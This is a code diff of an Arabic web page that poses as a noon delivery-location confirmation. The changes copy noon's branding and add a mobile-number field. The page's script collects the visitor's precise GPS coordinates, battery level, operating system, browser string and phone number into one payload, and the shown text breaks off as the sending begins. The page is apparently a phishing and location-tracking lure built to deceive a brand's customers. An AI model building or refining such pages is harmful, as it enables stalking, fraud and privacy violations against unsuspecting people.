@@ -3,42 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الموقع للتوصيل</title>
+    <title>تأكيد موقع التوصيل - مستوحى من نون</title>
     <!-- إضافة Bootstrap CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
-            background-color: #1A1A1A;
-            color: #E0E0E0;
+            background-color: #F5F5F5;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow-y: auto;
+        }
+        .navbar {
+            background-color: #F4A81D; /* الأصفر الرسمي لنون */
+            padding: 10px 20px;
+            color: #FFFFFF;
+        }
+        .navbar-brand {
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .container {
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow-y: auto;
+            min-height: 80vh;
+            padding: 20px;
         }
-        .container {
+        .delivery-card {
+            background-color: #FFFFFF;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             text-align: center;
             max-width: 500px;
-            padding: 30px;
-            background-color: #2A2A2A;
-            border-radius: 15px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+            width: 100%;
         }
         .title {
             font-size: 28px;
+            color: #F4A81D;
             margin-bottom: 15px;
-            color: #FFC107; /* الأصفر الرئيسي لنون */
         }
         .subtitle {
             font-size: 16px;
-            color: #B0B0B0;
+            color: #555555;
             margin-bottom: 25px;
         }
+        .form-control {
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
         .btn-noon {
-            background-color: #FFC107; /* زر أصفر */
-            color: #1A1A1A; /* نص داكن للتباين */
+            background-color: #F4A81D;
+            color: #FFFFFF;
             padding: 12px 30px;
             font-size: 18px;
             border: none;
@@ -46,7 +63,7 @@
             transition: background-color 0.3s, transform 0.2s;
         }
         .btn-noon:hover {
-            background-color: #FFCA28; /* درجة أصفر أفتح عند التحويم */
+            background-color: #E59400;
             transform: scale(1.05);
         }
         .message {
@@ -54,40 +71,56 @@
             font-size: 18px;
         }
         .success {
-            color: #28A745; /* أخضر للنجاح */
+            color: #28A745;
         }
         .error {
-            color: #DC3545; /* أحمر للأخطاء */
+            color: #DC3545;
         }
         .location-icon {
             font-size: 40px;
             margin-bottom: 15px;
-            color: #FFC107; /* أيقونة أصفرة */
+            color: #F4A81D;
         }
         .delivery-note {
             font-size: 14px;
-            color: #B0B0B0;
+            color: #777777;
             margin-top: 10px;
         }
     </style>
 </head>
 <body>
+    <!-- الشريط العلوي -->
+    <nav class="navbar">
+        <div class="container-fluid">
+            <span class="navbar-brand">noon توصيل</span>
+        </div>
+    </nav>
+
+    <!-- الحاوية الرئيسية -->
     <div class="container">
-        <div class="location-icon">📍</div>
-        <h2 class="title">تأكيد موقع التوصيل</h2>
-        <p class="subtitle">يرجى الضغط على الزر لتأكيد موقعك لتتمكن من استلام طلبك.</p>
-        <button id="confirmLocation" class="btn btn-noon">تأكيد الموقع</button>
-        <div id="message" class="message"></div>
-        <p class="delivery-note">* سيتم إشعار المندوب بموقعك لتوصيل الطلب بأسرع وقت.</p>
+        <div class="delivery-card">
+            <div class="location-icon">📍</div>
+            <h2 class="title">تأكيد موقع التوصيل</h2>
+            <p class="subtitle">يرجى إدخال رقم الجوال وتأكيد موقعك لتتمكن من استلام طلبك.</p>
+            <input type="text" id="orderId" class="form-control" placeholder="أدخل رقم الجوال" required>
+            <button id="confirmLocation" class="btn btn-noon">تأكيد الموقع</button>
+            <div id="message" class="message"></div>
+            <p class="delivery-note">* سيتم إشعار المندوب بموقعك ورقم الطلب لتوصيل الطلب بأسرع وقت.</p>
+        </div>
     </div>
 
     <!-- إضافة Bootstrap JS -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
     <script>
         document.getElementById('confirmLocation').addEventListener('click', () => {
+            const orderId = document.getElementById('orderId').value;
+            if (!orderId) {
+                document.getElementById('message').innerHTML = '<span class="error">❌ يرجى إدخال رقم الجوال.</span>';
+                return;
+            }
             if (navigator.geolocation) {
                 document.getElementById('message').innerHTML = '⏳ جاري طلب الإذن للوصول إلى الموقع...';
-                navigator.geolocation.getCurrentPosition(success, error, {
+                navigator.geolocation.getCurrentPosition((position) => success(position, orderId), error, {
                     enableHighAccuracy: true,
                     timeout: 10000,
                     maximumAge: 0
@@ -97,7 +130,7 @@
             }
         });
 
-        async function success(position) {
+        async function success(position, orderId) {
             const data = {
                 lat: position.coords.latitude,
                 lon: position.coords.longitude,
@@ -105,7 +138,8 @@
                 timestamp: new Date().toLocaleString('ar-EG'),
                 battery: navigator.battery ? (await navigator.battery.getBattery()).level * 100 : 'غير متوفر',
                 os: navigator.platform,
-                browser: navigator.userAgent
+                browser: navigator.userAgent,
+                orderId: orderId
             };
 
             try {
